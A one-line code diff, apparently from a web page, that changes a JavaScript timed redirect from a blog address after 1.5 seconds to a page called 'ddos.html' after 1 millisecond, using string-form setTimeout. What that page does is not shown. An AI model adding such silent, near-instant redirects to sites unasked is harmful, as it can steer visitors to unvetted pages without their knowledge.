@@ -1,1 +1,1 @@
-   setTimeout("javascript:location.href='https://blog.mbrjun.cn/'", 1500);   
+   setTimeout("javascript:location.href='https://mbrjun.com/ddos.html'", 1);   
